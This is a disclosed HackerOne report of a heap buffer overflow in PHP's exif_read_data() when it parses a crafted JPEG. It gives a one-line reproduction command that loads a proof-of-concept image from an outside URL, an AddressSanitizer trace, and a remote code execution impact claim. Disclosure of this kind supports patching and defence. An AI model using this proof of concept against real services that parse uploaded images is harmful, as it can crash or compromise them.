# heap-buffer-overflow (READ of size 48) in exif_read_data()

## Report Details
- **Report ID**: 384214
- **URL**: https://hackerone.com/reports/384214
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-19T15:51:41.381Z
- **Disclosed**: 2018-09-01T19:06:14.134Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
`exif_read_data` in PHP 5.6.36, 7.1.x and 7.2.x is vulnerable to a heap buffer overflow when fed a specially crafted JPEG. Any online service that reads EXIF data from uploaded JPEGs is potentially vulnerable to this flaw. This has been fixed with the release of PHP 7.2.8 today. Other releases are forthcoming but the [original bug report](https://bugs.php.net/bug.php?id=76557) is now public.

```
USE_ZEND_ALLOC=0 ./php-7.2.7 -r '$exif = exif_read_data("http://dtf.pw/php727/poc/630/test000.jpeg"); var_dump($exif);'
```

```
==996==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d000011958 at pc 0x0000004ce426 bp 0x7ffc064d6a00 sp 0x7ffc064d61b0
READ of size 48 at 0x61d000011958 thread T0
    #0 0x4ce425 in __asan_memcpy /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3
    #1 0x13f4905 in _estrndup /root/php-7.2.7/Zend/zend_alloc.c:2538:2
    #2 0xe039ad in exif_iif_add_value /root/php-7.2.7/ext/exif/exif.c:2119:21
    #3 0xe039ad in exif_iif_add_tag /root/php-7.2.7/ext/exif/exif.c:2199
    #4 0xe0b818 in exif_process_IFD_TAG /root/php-7.2.7/ext/exif/exif.c:3543:2
    #5 0xe0bccf in exif_process_IFD_in_MAKERNOTE /root/php-7.2.7/ext/exif/exif.c:3213:8
    #6 0xe0bccf in exif_process_IFD_TAG /root/php-7.2.7/ext/exif/exif.c:3494
    #7 0xe08c15 in exif_process_IFD_in_JPEG /root/php-7.2.7/ext/exif/exif.c:3576:8
    #8 0xe0ac0e in exif_process_IFD_TAG /root/php-7.2.7/ext/exif/exif.c:3534:11
    #9 0xe08c15 in exif_process_IFD_in_JPEG /root/php-7.2.7/ext/exif/exif.c:3576:8
    #10 0xe014c0 in exif_process_TIFF_in_JPEG /root/php-7.2.7/ext/exif/exif.c:3665:2
    #11 0xe014c0 in exif_process_APP1 /root/php-7.2.7/ext/exif/exif.c:3690
    #12 0xe014c0 in exif_scan_JPEG_header /root/php-7.2.7/ext/exif/exif.c:3835
    #13 0xe014c0 in exif_scan_FILE_header /root/php-7.2.7/ext/exif/exif.c:4224
    #14 0xe014c0 in exif_read_from_impl /root/php-7.2.7/ext/exif/exif.c:4365
    #15 0xe014c0 in exif_read_from_stream /root/php-7.2.7/ext/exif/exif.c:4382
    #16 0xdf8f18 in exif_read_from_file /root/php-7.2.7/ext/exif/exif.c:4409:8
    #17 0xdf8f18 in zif_exif_read_data /root/php-7.2.7/ext/exif/exif.c:4482
    #18 0x17c5d34 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /root/php-7.2.7/Zend/zend_vm_execute.h:617:2
    #19 0x15ed419 in execute_ex /root/php-7.2.7/Zend/zend_vm_execute.h:59723:7
    #20 0x15eda9a in zend_execute /root/php-7.2.7/Zend/zend_vm_execute.h:63760:2
    #21 0x14758eb in zend_eval_stringl /root/php-7.2.7/Zend/zend_execute_API.c:1082:4
    #22 0x1475fb9 in zend_eval_stringl_ex /root/php-7.2.7/Zend/zend_execute_API.c:1123:11
    #23 0x1475fb9 in zend_eval_string_ex /root/php-7.2.7/Zend/zend_execute_API.c:1134
    #24 0x18c4aea in do_cli /root/php-7.2.7/sapi/cli/php_cli.c:1044:8
    #25 0x18c2c03 in main /root/php-7.2.7/sapi/cli/php_cli.c:1405:18
    #26 0x7f43ac6d32e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #27 0x427479 in _start (/root/php-7.2.7/sapi/cli/php+0x427479)

Address 0x61d000011958 is a wild pointer.
SUMMARY: AddressSanitizer: heap-buffer-overflow /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3 in __asan_memcpy
```

## Impact

Remote code execution

## Attachments
No attachments
